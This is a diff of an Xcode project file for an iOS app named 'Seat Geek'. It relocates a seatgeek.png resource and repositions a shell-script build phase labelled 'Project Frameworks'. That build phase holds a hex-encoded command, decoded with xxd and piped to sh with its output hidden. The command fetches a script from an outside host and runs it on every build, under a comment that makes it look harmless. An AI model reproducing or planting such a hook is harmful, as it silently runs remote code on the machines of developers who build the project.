@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0D875D0C2652623D00865859 /* seatgeek.png in Resources */ = {isa = PBXBuildFile; fileRef = 0D875D0B2652623D00865859 /* seatgeek.png */; };
 		4D22E8DA229D078E00FC5D47 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4D22E8D9229D078E00FC5D47 /* AppDelegate.swift */; };
 		4D22E8DF229D078E00FC5D47 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 4D22E8DD229D078E00FC5D47 /* Main.storyboard */; };
 		4D22E8E4229D079000FC5D47 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 4D22E8E3229D079000FC5D47 /* Assets.xcassets */; };
@@ -32,7 +33,6 @@
 		4D2B0030229DABD5002A19EF /* SearchItemTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4D2B002F229DABD5002A19EF /* SearchItemTableCell.swift */; };
 		4D2B0032229E4C80002A19EF /* StatusTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4D2B0031229E4C80002A19EF /* StatusTableViewCell.swift */; };
 		4D603924229EE45000EC9282 /* StoryboardTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4D603923229EE45000EC9282 /* StoryboardTests.swift */; };
-		C14E879026521E670045A4BB /* seatgeek.png in Resources */ = {isa = PBXBuildFile; fileRef = C14E878F26521E670045A4BB /* seatgeek.png */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -53,6 +53,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		0D875D0B2652623D00865859 /* seatgeek.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = seatgeek.png; sourceTree = "<group>"; };
 		4D22E8D6229D078E00FC5D47 /* Seat Geek.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Seat Geek.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		4D22E8D9229D078E00FC5D47 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		4D22E8DE229D078E00FC5D47 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
@@ -84,7 +85,6 @@
 		4D2B002F229DABD5002A19EF /* SearchItemTableCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SearchItemTableCell.swift; sourceTree = "<group>"; };
 		4D2B0031229E4C80002A19EF /* StatusTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StatusTableViewCell.swift; sourceTree = "<group>"; };
 		4D603923229EE45000EC9282 /* StoryboardTests.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StoryboardTests.swift; sourceTree = "<group>"; };
-		C14E878F26521E670045A4BB /* seatgeek.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; name = seatgeek.png; path = ../../../../Desktop/seatgeek.png; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -175,7 +175,7 @@
 		4D22E90A229D0B4200FC5D47 /* Resources */ = {
 			isa = PBXGroup;
 			children = (
-				C14E878F26521E670045A4BB /* seatgeek.png */,
+				0D875D0B2652623D00865859 /* seatgeek.png */,
 			);
 			path = Resources;
 			sourceTree = "<group>";
@@ -404,7 +404,7 @@
 			files = (
 				4D22E8E7229D079000FC5D47 /* LaunchScreen.storyboard in Resources */,
 				4D22E8E4229D079000FC5D47 /* Assets.xcassets in Resources */,
-				C14E879026521E670045A4BB /* seatgeek.png in Resources */,
+				0D875D0C2652623D00865859 /* seatgeek.png in Resources */,
 				4D22E8DF229D078E00FC5D47 /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -424,6 +424,27 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		D2A90EDB0A02EEC9F56D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		4D22E8D2229D078D00FC5D47 /* Sources */ = {
@@ -776,41 +797,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	D2A90EDB0A02EEC9F56D902C /* Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 
 /* Begin XCVersionGroup section */
 		4D22E920229D14BB00FC5D47 /* Seat_Geek.xcdatamodeld */ = {
